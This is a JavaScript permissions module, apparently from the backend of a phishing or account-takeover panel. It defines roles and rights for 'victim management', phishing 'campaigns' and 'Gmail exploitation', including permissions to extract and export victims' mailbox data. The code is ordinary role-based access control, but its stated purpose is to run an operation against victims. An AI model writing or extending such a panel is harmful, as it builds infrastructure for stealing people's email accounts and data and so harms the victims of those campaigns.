// Permission checking middleware
// Works in conjunction with auth.js

const { requirePermission } = require('./auth');

/**
 * Permission constants
 */
const PERMISSIONS = {
  // Victim management
  VICTIMS_VIEW: 'victims:view',
  VICTIMS_EDIT: 'victims:edit',
  VICTIMS_DELETE: 'victims:delete',
  VICTIMS_EXPORT: 'victims:export',
  
  // Campaign management
  CAMPAIGNS_VIEW: 'campaigns:view',
  CAMPAIGNS_CREATE: 'campaigns:create',
  CAMPAIGNS_EDIT: 'campaigns:edit',
  CAMPAIGNS_DELETE: 'campaigns:delete',
  
  // Gmail exploitation
  GMAIL_ACCESS: 'gmail:access',
  GMAIL_EXTRACT: 'gmail:extract',
  GMAIL_EXPORT: 'gmail:export',
  
  // Activity logs
  ACTIVITY_VIEW: 'activity:view',
  ACTIVITY_EXPORT: 'activity:export',
  
  // System administration
  SYSTEM_ADMIN: 'system:admin',
  SYSTEM_SETTINGS: 'system:settings'
};

/**
 * Role-based permission mapping
 */
const ROLE_PERMISSIONS = {
  viewer: [
    PERMISSIONS.VICTIMS_VIEW,
    PERMISSIONS.CAMPAIGNS_VIEW,
    PERMISSIONS.ACTIVITY_VIEW
  ],
  operator: [
    PERMISSIONS.VICTIMS_VIEW,
    PERMISSIONS.VICTIMS_EDIT,
    PERMISSIONS.CAMPAIGNS_VIEW,
    PERMISSIONS.GMAIL_ACCESS,
    PERMISSIONS.ACTIVITY_VIEW
  ],
  senior_operator: [
    PERMISSIONS.VICTIMS_VIEW,
    PERMISSIONS.VICTIMS_EDIT,
    PERMISSIONS.VICTIMS_EXPORT,
    PERMISSIONS.CAMPAIGNS_VIEW,
    PERMISSIONS.CAMPAIGNS_CREATE,
    PERMISSIONS.CAMPAIGNS_EDIT,
    PERMISSIONS.GMAIL_ACCESS,
    PERMISSIONS.GMAIL_EXTRACT,
    PERMISSIONS.ACTIVITY_VIEW,
    PERMISSIONS.ACTIVITY_EXPORT
  ],
  admin: [
    ...Object.values(PERMISSIONS)
  ],
  super_admin: ['*'] // All permissions
};

module.exports = {
  PERMISSIONS,
  ROLE_PERMISSIONS,
  requirePermission
};

